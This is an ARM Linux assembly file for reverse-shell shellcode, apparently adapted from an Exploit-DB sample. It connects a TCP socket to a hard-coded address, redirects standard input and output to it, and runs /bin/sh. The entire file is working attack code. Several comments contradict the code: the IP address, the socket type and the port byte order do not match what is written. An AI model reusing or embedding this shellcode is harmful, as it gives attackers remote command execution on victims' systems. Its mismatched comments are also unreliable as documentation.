/*
 Shell code based on "arm-bind-connect-udp"
 Originally written by Daniel Godas-Lopez <gmail account dgodas>
 Found on: https://www.exploit-db.com/shellcodes/15315

 Adapted to use a single TCP socket, on any interface.

*/


.section    .text
.global     _start

.code       32

_start:

.if 1
    /*
      close(3), close(4), ..., close(1024)
     */

    mov %r1, $1024
1:  mov %r0, %r1
    svc 0x00900006
    subs %r1, %r1, $1
    subs %r2, %r1, $3
    bpl 1b
.endif

    # set up pointer to beginning of data (r5)
    adr     r5, settings_start

    # socket(AF_INET, SOCK_DGRAM, 0) => socket(2, 1, 0)
    mov     r0, #2
    mov     r1, #1
    mov     r2, #0
    push    {r0, r1, r2}
    mov     r1, sp
    mov     r0, #1
    svc     #0x00900066

    # save '&sid' in r6
    mov     r6, r0

    # connect(&sid, &settings, ip_addr_len) => connect(&sid, &settings, 16)
    mov     r1, r5          @ settings_start
    mov     r2, #16
    add     r7, r7, #2
    push    {r0, r1, r2}
    mov     %r0, $3                      /* connect */
    mov     %r1, %sp
    svc     0x00900066
    add     %sp, %sp, $20

    /*
      dup2(&sid,0); 
      dup2(soc_cli,1); 
      dup2(soc_cli,2);
     */

    mov %r1, $2
1:  mov %r0, %r6
    svc 0x0090003f
    subs %r1, %r1, $1
    bpl 1b

    /*
      execve("/bin/sh", parms, env);
     */

    sub %r1, %sp, $4    /* argv[0] = "sh" */
    sub %r2, %r2, %r2    /* argv[1] = 0x00000000 */
    mov %r3, $0x2f
    mov %r7, $0x62
    add %r3, %r7, lsl $8
    mov %r7, $0x69
    add %r3, %r7, lsl $16
    mov %r7, $0x6e
    add %r3, %r7, lsl $24    /* '/'  'b'  'i'  'n'  */
    mov %r4, $'/'
    mov %r7, $'s'
    add %r4, %r7, lsl $8
    mov %r7, $'h'
    add %r4, %r7, lsl $16    /* '/'  's'  'h'  0x00 */
    mov %r5, $'s'
    mov %r7, $'h'
    add %r5, %r7, lsl $8    /* 's'  'h'  0x00 0x00 */ 

    push {%r1, %r2, %r3, %r4, %r5}

    add %r0, %sp, $8    /* filename ptr */
    add %r1, %sp, $0    /* argv ptr */
    add %r2, %sp, $4    /* env ptr */

    svc 0x0090000b

settings_start:
.short      2

port_num:   @ 1799 (big endian)
.short      1799

ip_addr:    @ 10.1.1.1
.byte       10
.byte       2
.byte       2
.byte       2
